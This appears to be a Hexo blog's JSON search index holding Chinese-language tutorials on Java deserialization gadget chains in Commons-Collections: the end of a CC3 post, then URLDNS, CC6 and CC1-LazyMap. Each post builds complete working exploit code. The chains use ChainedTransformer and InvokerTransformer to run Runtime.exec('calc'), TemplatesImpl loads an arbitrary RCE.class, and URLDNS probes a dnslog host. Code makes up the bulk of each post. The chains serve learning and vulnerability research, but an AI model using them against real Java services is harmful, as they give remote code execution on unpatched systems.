Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = aClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); templates.newTransformer();&#125; 但是这里报空指针异常了，断点调试一下，发现问题出在defineTransletClasses方法中 这里判断加载类的父类的名字是否包含这个常量，如果不是走入else，else中变量_auxClasses为空，所以就会报空指针异常 那么问题找到了，这里存在两种方法处理： 要加载的类字节码继承这个父类 给_auxClasses赋值 但是看下面代码中判断了_transletIndex是否小于0，是的话就会报错。进入else时这个属性值是-1，所以第二种方法不可用，我们选择第一种 让自定义加载类继承父类并处理报错之后，重新编译。再次执行就能成功加载到自定义的类文件。那么说明我们这里没问题。 接下来只需要将这部分代码和CC链1的反序列化入口结合就完成了这条链。 结合CC链1-LazyMap反序列化入口构造EXP将构造的templates类加载器结合CC链1，即修改InvokerTransformer传入执行的方法 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647public static void main(String[] args) throws Exception &#123; TemplatesImpl templates = new TemplatesImpl(); // 通过反射给属性进行赋值 Class&lt;? extends TemplatesImpl&gt; templatesClass = templates.getClass(); Field nameFied = templatesClass.getDeclaredField(&quot;_name&quot;); nameFied.setAccessible(true); nameFied.set(templates, &quot;aaa&quot;); Field bytecodesField = templatesClass.getDeclaredField(&quot;_bytecodes&quot;); bytecodesField.setAccessible(true); // _bytecodes 是一个二维数组，但是参数传递过程中通过遍历获取其中的每一个一维数组进行加载 // 这里先将字节码读取为一个一维数组，然后把这个一维数组放入一个二维数组 byte[] code = Files.readAllBytes(Paths.get(&quot;E:\\\\Temp\\\\RCE.class&quot;)); byte[][] codes = &#123;code&#125;; bytecodesField.set(templates, codes); Field tfactoryField = templatesClass.getDeclaredField(&quot;_tfactory&quot;); tfactoryField.setAccessible(true); tfactoryField.set(templates, new TransformerFactoryImpl()); Transformer[] transformers = &#123; new ConstantTransformer(templates), new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, null) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); //decorate.get(Runtime.getRuntime()); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); // 这里创建对象时不用像CC1TransformedMap那样需要注意传入的注解类成员变量相关 // 转为InvocationHandler作为代理处理器使用 InvocationHandler o = (InvocationHandler) annotationConstructor.newInstance(Target.class, decorate); // 这里实现了Map接口，要作为Map使用，则转为Map类型 Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o); // 这里再次创建对象，传入代理过后的对象 Object o1 = annotationConstructor.newInstance(Target.class, map); //serialize(o1); unserialize(&quot;ser.bin&quot;);&#125; 同理，还可以结合CC链1另外一条链以及CC链6的执行点进行利用，毕竟这里只是只是执行点不同 与ysoserial中CC3的区别可以看到在ysoserial中，ConstantTransformer传入的是TrAXFilter，也没有使用InvokerTransformer执行，而是使用InstantiateTransformer 这里其实是在newTransformer方法的基础上进一步查找利用，在TrAXFilter的构造方法中进行调用，但是这个TrAXFilter类不能进行反序列化。然后就结合了InstantiateTransformer#transform方法会创建对象的特性进行了利用 总结正如开头所说，CC链3只是利用TemplatesImpl存在的类加载调用，作为执行类，替换了Runtime类传入了CC链1、CC链6中。相对于链1和链6来说，前面的调用点都是一样的，只是后面执行类的调用比起直接传入Runtime类复杂了一点。 其实这些反序列化链基本可以分为三部分：反序列化入口、调用点、执行点。每个部分可以根据合适的条件进行拆分组合。","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"URLDNS链","slug":"URLDNS链","date":"2025-07-13T12:15:01.000Z","updated":"2025-07-13T13:10:52.806Z","comments":true,"path":"2025/07/13/URLDNS链/","permalink":"http://example.com/2025/07/13/URLDNS%E9%93%BE/","excerpt":"","text":"URLDNS链URLDNS链是最简单的链，用来了解反序列化链再合适不过，这条链常用来探测是否存在反序列化漏洞 执行点：URL在URL#hashCode方法中，会调用handler.hashCode对当前对象进行hash计算 1234567public synchronized int hashCode() &#123; if (hashCode != -1) return hashCode; hashCode = handler.hashCode(this); return hashCode;&#125; 而这里的handler.hashCode中，会对传入的url进行解析，具体就是在getHostAddress处 12345678910111213141516171819protected int hashCode(URL u) &#123; int h = 0; // Generate the protocol part. String protocol = u.getProtocol(); if (protocol != null) h += protocol.hashCode(); // Generate the host part. InetAddress addr = getHostAddress(u); if (addr != null) &#123; h += addr.hashCode(); &#125; else &#123; String host = u.getHost(); if (host != null) h += host.toLowerCase().hashCode(); &#125; ...&#125; 也就是说如果我们构建了一个URL对象，其中地址为dnslog地址，那么当调用到URL#hashCode的方法时就会去进行DNS解析，我们就能在平台上看到DNS请求。 而说到会调用hashCode的地方，那就首选HashMap 反序列化起点：HashMap在HashMap#readObject方法最后，有一串代码：putVal(hash(key), key, value, false, false);，对key通过hash方法进行计算 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 查看这个hash方法，内部就是在调用key#hashCode方法，如果传入一个URL类，那么就会执行到URL#hashCode 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 构造EXP根据上述步骤构造如下代码 12345678910111213public static void main(String[] args) throws Exception &#123; // 创建一个 URL 对象，并传入DNSlog地址 URL url = new URL(&quot;http://1v4k4e.dnslog.cn&quot;); // 创建一个 HashMap 对象，并将 URL 作为key传入 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(url, &quot;value&quot;); // 序列化 util.serialize(hashMap); // 反序列化 util.unserialize(&quot;ser.bin&quot;); 为了避免干扰，序列化和反序列化之间间隔几分钟在执行，会发现在序列化时进行了dns请求，但是反序列化时则没有进行，这是因为在put时就执行了hashCode 123public V put(K key, V value) &#123; return putVal(hash(key), key, value, false, true);&#125; 在URL#hashCode处打上断点，对序列化过程进行调试。发现hashCode这个属性默认为-1，所以不进入if判断，然后就会进行解析（这里调试时可能会在断点停留好几次，只有一次是想要停下的） 那么这里就采用反射的方式，在put之前修改hashCode的值，put之后改回去，最终代码如下 1234567891011121314151617181920212223242526public class URLDNS &#123; public static void main(String[] args) throws Exception &#123; //创建一个 URL 对象，并传入DNSlog地址 URL url = new URL(&quot;http://miocmv.dnslog.cn&quot;); //创建一个 HashMap 对象，并将 URL 作为key传入 HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); Class&lt;? extends URL&gt; aClass = url.getClass(); Field hashCode = aClass.getDeclaredField(&quot;hashCode&quot;); hashCode.setAccessible(true); hashCode.set(url, 1); hashMap.put(url, &quot;value&quot;); hashCode.set(url, -1); //序列化 util.serialize(hashMap); //反序列化 //util.unserialize(&quot;ser.bin&quot;); &#125;&#125; 序列化时调试，hashCode值为1，进入if判断 反序列化调试，hashCode为-1，不进入if判断，然后执行到后续代码进行解析","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"}]},{"title":"浅述CC链(3)：CC链6","slug":"CC链6","date":"2025-07-12T07:43:39.000Z","updated":"2025-07-13T09:30:48.073Z","comments":true,"path":"2025/07/12/CC链6/","permalink":"http://example.com/2025/07/12/CC%E9%93%BE6/","excerpt":"","text":"CC链6CC链6是CC链1-LazyMap+URLDNS链的结合： URLDNS链中是通过hashMap#readObject方法中，对key进行哈希计算调用了hashCode，当key被赋值为URL类时，调用URL类的hashcode方法会调用到java.net.URLStreamHandler#hashCode，在这个方法里面对传入的域名进行解析，解析时DNSLog就能够获取到对应的数据。 而CC链1-LazyMap是LazyMap#get方法调用到了InvokerTransformer#transform，然后找到AnnotationInvocationHandler的invoke方法调用了LazyMap#get。 如果找到一个类的hashCode方法调用了LazyMap#get，把这个类放入到hashMap，反序列化时就能通过hashCode方法去调用到LazyMap#get最终调用到InvokerTransformer#transform，所以就找到了这里的一个中间类：TiedMapEntry 搭建环境 jdk8u71 Commons-Collections 3.2.1 执行点：InvokerTransformer这里的执行点还是InvokerTransformer，不再过多赘述 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 调用点1：LazyMap这里的调用点依然是LazyMap#get，也不再过多赘述 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 调用点2：TiedMapEntry看TiedMapEntry#hashCode方法，里面调用了本身的getValue方法 12345public int hashCode() &#123; Object value = getValue(); return (getKey() == null ? 0 : getKey().hashCode()) ^ (value == null ? 0 : value.hashCode()); &#125; 这里的getValue里面调用了一个map.get(key);，按照之前的思路，我们给map赋值为LazyMap，此时就会调用LazyMap#get，key值表示transform的参数进行传递 123public Object getValue() &#123; return map.get(key);&#125; 这里的map来自于TiedMapEntry的构造方法，这个构造方法接收一个map和一个对象，那么在这里传入LazyMap就能够调用到其get方法，最后调用到transform 12345public TiedMapEntry(Map map, Object key) &#123; super(); this.map = map; this.key = key;&#125; 那么来利用当前已知条件来测试代码 1234567891011121314151617181920public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); // 上面都是LazyMap的调用，不再叙述 // 这里是调用TiedMapEntry TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;aaa&quot;); tiedMapEntry.hashCode();&#125; 运行代码能够弹出计算器，则说明没问题。现在我们需要将这个代码与URLDNS链结合起来，也就是放入到HashMap中，再进行序列化与反序列化 入口：HashMap这条链的反序列化入口位于HashMap#readObject，要触发到之前的链，需要走到最下面的putVal(hash(key), key, value, false, false);， 12345678910111213141516171819202122232425262728293031323334353637383940private void readObject(java.io.ObjectInputStream s) throws IOException, ClassNotFoundException &#123; // Read in the threshold (ignored), loadfactor, and any hidden stuff s.defaultReadObject(); reinitialize(); if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new InvalidObjectException(&quot;Illegal load factor: &quot; + loadFactor); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings &lt; 0) throw new InvalidObjectException(&quot;Illegal mappings count: &quot; + mappings); else if (mappings &gt; 0) &#123; // (if zero, use defaults) // Size the table using given load factor only if within // range of 0.25...4.0 float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f); float fc = (float)mappings / lf + 1.0f; int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc &gt;= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;) Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i &lt; mappings; i++) &#123; @SuppressWarnings(&quot;unchecked&quot;) K key = (K) s.readObject(); @SuppressWarnings(&quot;unchecked&quot;) V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); &#125; &#125;&#125; 当运行到hash(key)时就会调用hash方法，可以看到这里其实就是在调用hashCode方法，也就是说我们构造的HashMap对象的key就传入TiedMapEntry对象，然后就会调用到TiedMapEntry#hashCode 1234static final int hash(Object key) &#123; int h; return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);&#125; 构造一下代码 12345678910111213141516171819202122232425262728293031323334public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); serialize(hashMap); //unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 但是这里还存在问题，直接进行序列化会报错，在DNSURL链中也存在相同的问题。 这是因为在put时就调用了hashCode执行了代码，但是最后执行代码获取的ProcessImpl实例无法进行序列化就产生了报错 所以这里我们采用URLDNS链中类似的方法，通过反射来处理。这里可以处理的地方很多，只要改变原本的同名方法调用即可，我这里选择的是对LazyMap#get的方法调用进行处理，factory赋予任意一个Transformer，这样就不会调用到Invokertransformer#transform，然后通过反射再给factory赋值 1234567891011121314151617181920212223242526public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); Class&lt;? extends Map&gt; aClass = decorate.getClass(); Field factory = aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate, chainedTransformer); serialize(hashMap); unserialize(&quot;ser.bin&quot;);&#125; 可以看到在这里创建LazyMap时传入了一个new ConstantTransformer(1)，put结束后又通过反射重新给factory属性进行赋值 按道理来说此时应该已经构造好了，但是反序列化时还是没有弹出计算器，打上断点进行调试，发现在LazyMap#get方法处的判断没有满足 查看map的属性，发现其中已经多了一个key为111，这与LazyMap有关，LazyMap其实是一种懒加载，当获取key时如果没有这个key，就会自动在当前map中添加 那么直接在序列化之前将这个map中的111去除即可 12345678910111213141516171819202122232425262728293031323334353637383940public class CC6 &#123; public static void main(String[] args) throws Exception &#123; Transformer[] transformers = &#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null,null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;value&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, new ConstantTransformer(1)); TiedMapEntry tiedMapEntry = new TiedMapEntry(decorate,&quot;111&quot;); HashMap&lt;Object, Object&gt; hashMap = new HashMap&lt;&gt;(); hashMap.put(tiedMapEntry, &quot;value&quot;); decorate.remove(&quot;111&quot;); Class&lt;? extends Map&gt; aClass = decorate.getClass(); Field factory = aClass.getDeclaredField(&quot;factory&quot;); factory.setAccessible(true); factory.set(decorate, chainedTransformer); serialize(hashMap); unserialize(&quot;ser.bin&quot;); &#125; public static void serialize(Object object) throws Exception &#123; ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;)); oos.writeObject(object); &#125; public static Object unserialize(String fileName) throws Exception &#123; ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName)); Object obj = ois.readObject(); return obj; &#125;&#125; 此时执行反序列化即可弹出计算器，证明当前exp可用 总结CC链6这条链相对简单，就是CC链1-LazyMap的后半截加上URLDNS的前半截，组合成为一条新的链，并且这条链不受java版本限制","categories":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/categories/JAVA%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"JAVA安全","slug":"JAVA安全","permalink":"http://example.com/tags/JAVA%E5%AE%89%E5%85%A8/"},{"name":"CC链","slug":"CC链","permalink":"http://example.com/tags/CC%E9%93%BE/"}]},{"title":"浅述CC链(2)：CC链1-LazyMap","slug":"CC链1-LazyMap","date":"2025-07-08T14:36:56.000Z","updated":"2025-07-13T09:19:59.733Z","comments":true,"path":"2025/07/08/CC链1-LazyMap/","permalink":"http://example.com/2025/07/08/CC%E9%93%BE1-LazyMap/","excerpt":"","text":"CC链1-LazyMap这里来说说CC链1的另外一条链：LazyMap。它和TransformedMap链的执行点一样，都是InvokerTransformer，不同的是中间的调用点不同，调用时涉及到动态代理相关知识，需要提前学习了解这块的内容。 搭建环境 jdk8u65 Commons-Collections 3.2.1 执行点：InvokerTransformer这里的执行点和TransformedMap链相同，不再过多赘述 1234567891011121314151617public Object transform(Object input) &#123; if (input == null) &#123; return null; &#125; try &#123; Class cls = input.getClass(); Method method = cls.getMethod(iMethodName, iParamTypes); return method.invoke(input, iArgs); &#125; catch (NoSuchMethodException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;); &#125; catch (IllegalAccessException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;); &#125; catch (InvocationTargetException ex) &#123; throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex); &#125;&#125; 调用点：LazyMap与CC链1-TransformedMap不同的就在这里，这条链的调用点在同一个包中的LazyMap链中 具体的调用点是在LazyMap的get方法中 123456789public Object get(Object key) &#123; // create value for key if key is not currently in the map if (map.containsKey(key) == false) &#123; Object value = factory.transform(key); map.put(key, value); return value; &#125; return map.get(key);&#125; 这里是factory在调用transform方法，这里的factory来自于该类的构造函数，所以这里就要传入invokertransformer，才能变成invokertransformer.transform 1234567protected LazyMap(Map map, Factory factory) &#123; super(map); if (factory == null) &#123; throw new IllegalArgumentException(&quot;Factory must not be null&quot;); &#125; this.factory = FactoryTransformer.getInstance(factory);&#125; 但是这里构造函数通过protected修饰，所以还需要找调用点，然后找到了当前类的decorate方法，接收参数然后返回当前类的实例 123public static Map decorate(Map map, Transformer factory) &#123; return new LazyMap(map, factory);&#125; 尝试构造下利用代码，参数有两个，第一个是一个Map，第二个需要传入构造的invokertransformer 12345678910public static void main(String[] args) throws Exception &#123; InvokerTransformer invokerTransformer = new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, invokerTransformer); decorate.get(Runtime.getRuntime());&#125; 执行代码能够弹出计算器，则构造没问题，需要注意的是在get方法中存在一个判断，判断传入的map集合中是否包含传入get方法的参数，我们这里构造的不包含，所以能够进入代码。 然后我们需要查找get方法的调用。 调用点和反序列化入口：AnnotationInvocationHandler调用get方法的地方非常多，最后找到了AnnotationInvocationHandler这个类，和CC链1-TransformedMap的入口类一样，但是这里暂时作为调用点存在，这里的调用点在invoke方法中的Object result = memberValues.get(member);处调用了get方法，而memberValues来自于构造方法赋值，要想memberValues.get变成LazyMap.get，那么构造方法中就需要传入前面创建好的decorate。 12345678910111213141516171819202122232425262728293031323334public Object invoke(Object proxy, Method method, Object[] args) &#123; String member = method.getName(); Class&lt;?&gt;[] paramTypes = method.getParameterTypes(); // Handle Object and Annotation methods if (member.equals(&quot;equals&quot;) &amp;&amp; paramTypes.length == 1 &amp;&amp; paramTypes[0] == Object.class) return equalsImpl(args[0]); if (paramTypes.length != 0) throw new AssertionError(&quot;Too many parameters for an annotation method&quot;); switch(member) &#123; case &quot;toString&quot;: return toStringImpl(); case &quot;hashCode&quot;: return hashCodeImpl(); case &quot;annotationType&quot;: return type; &#125; // Handle annotation member accessors Object result = memberValues.get(member); if (result == null) throw new IncompleteAnnotationException(type, member); if (result instanceof ExceptionProxy) throw ((ExceptionProxy) result).generateException(); if (result.getClass().isArray() &amp;&amp; Array.getLength(result) != 0) result = cloneArray(result); return result;&#125; 其实这整个类AnnotationInvocationHandler是一个动态代理的调用处理器类，某个对象调用方法时使用了该类进行代理，就会自动执行该类的invoke方法。如调用A类的xxx方法，如果对A.method使用B类进行了动态代理，那么调用A.xxx的时候就会自动执行B.invoke，有点类似于php的魔术方法 那么当前状态下，我们这里作为代理类，应该代理哪个类呢？我们这里是反序列化链，最好的就是反序列化时会调用到被动态代理的对象的某个方法，正好当前类中存在反序列化readObject方法，所以最好选择readObject方法中可控的点传入被动态代理对象。 如何选择可控点？这里先查看invoke方法中执行到get方法时需要哪些条件来进行决定。 在执行到get前存在两个if和一个switch，在判断member和paramTypes，二者都来自于来自于mehtod，method其实就是要进行代理的方法。这里member获取的就是要代理的方法名，而paramTypes表示方法的参数类型列表 第一个if判断member是否存在equals，即方法名是否存在equals关键字，存在则返回，所以方法不能包含equals才能往下走。 第二个if判断paramTypes是否为0，如果不为0则报错，所以代理的方法需要是一个无参方法才能往下走 switch中则是定义了三个case，如果member满足任意一个都会直接返回，所以这里也不能满足这里的任意一个。 123456789101112131415161718192021222324252627282930313233private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException &#123; s.defaultReadObject(); // Check to make sure that types have not evolved incompatibly AnnotationType annotationType = null; try &#123; annotationType = AnnotationType.getInstance(type); &#125; catch(IllegalArgumentException e) &#123; // Class is no longer an annotation type; time to punch out throw new java.io.InvalidObjectException(&quot;Non-annotation type in annotation serial stream&quot;); &#125; Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes(); // If there are annotation members without values, that // situation is handled by the invoke method. for (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123; String name = memberValue.getKey(); Class&lt;?&gt; memberType = memberTypes.get(name); if (memberType != null) &#123; // i.e. member still exists Object value = memberValue.getValue(); if (!(memberType.isInstance(value) || value instanceof ExceptionProxy)) &#123; memberValue.setValue( new AnnotationTypeMismatchExceptionProxy( value.getClass() + &quot;[&quot; + value + &quot;]&quot;).setMember( annotationType.members().get(name))); &#125; &#125; &#125;&#125; 那么在readObject方法中满足以上条件调用点就是memberValues.entrySet()，即我们要对memberValues进行代理，而这个memberValues是构造方法中传入的一个Map，即创建的动态代理对象要实现Map接口，这样才能代理到Map中的方法。 创建动态代理存在三个参数： 被代理类的类加载器（通常用接口或相关类的类加载器） 被代理类要实现的接口数组（JDK 动态代理只能代理接口） 代理处理器，定义代理对象的方法调用逻辑。 这里已经知道了第二个参数是Map接口，那么其余两个参数呢？ 第一个参数：这个参数用来将代理类进行动态加载，这个类要能加载到接口类，所以直接选择LazyMap或者Map这两个类的加载器即可 第三个参数：我们要执行的invoke方法位于AnnotationInvocationHandler，所以这里传入AnnotationInvocationHandler的对象 那么根据这些条件来构造利用链 123456789101112131415161718192021222324252627282930public static void main(String[] args) throws Exception &#123; Transformer[] transformers = new Transformer[]&#123; new ConstantTransformer(Runtime.class), new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;), new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;), new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;) &#125;; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap&lt;Object, Object&gt; hMap = new HashMap&lt;&gt;(); hMap.put(&quot;key&quot;, &quot;value&quot;); Map decorate = LazyMap.decorate(hMap, chainedTransformer); //decorate.get(Runtime.getRuntime()); Class&lt;?&gt; annotationInvocationHandler = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;); Constructor&lt;?&gt; annotationConstructor = annotationInvocationHandler.getDeclaredConstructor(Class.class, Map.class); annotationConstructor.setAccessible(true); // 这里创建对象时不用像CC1TransformedMap那样需要注意传入的注解类成员变量相关 // 转为InvocationHandler作为代理处理器使用 InvocationHandler o = (InvocationHandler) annotationConstructor.newInstance(Target.class, decorate); // 这里实现了Map接口，要作为Map使用，则转为Map类型 Map map = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), new Class[]&#123;Map.class&#125;, o); // 这里再次创建对象，传入代理过后的对象 Object o1 = annotationConstructor.newInstance(Target.class, map); //serialize(o1); unserialize(&quot;ser.bin&quot;);&#125; 